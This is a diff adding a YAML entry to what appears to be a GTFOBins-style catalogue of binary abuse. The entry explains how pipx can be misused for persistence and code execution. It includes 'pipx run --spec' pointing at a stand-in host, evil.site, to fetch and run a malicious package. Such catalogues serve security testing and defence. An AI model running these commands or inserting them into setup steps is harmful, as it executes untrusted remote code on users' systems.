@@ -1,0 +1,23 @@
+---
+comment: |-
+  pipx is a Python package manager that installs and runs applications in isolated environments. It can be abused to fetch and execute malicious packages, enabling code execution and persistence without requiring elevated privileges.
+functions:
+  file-write:
+  - code: |-
+      pipx install malware
+    contexts:
+      sudo:
+        comment: |-
+          If run with elevated privileges, pipx can install packages system-wide, dropping malicious files globally.
+      unprivileged:
+        comment: |-
+          Installs a malicious package into ~/.local/bin, enabling persistence and arbitrary file writes.
+  inherit:
+  - code: |-
+      pipx run --spec git+https://evil.site/malware.git
+    comment: |-
+      The `--spec` flag allows fetching packages directly from a VCS or URL, which can be abused to execute remote code.
+    contexts:
+      unprivileged:
+    from: pip
+...
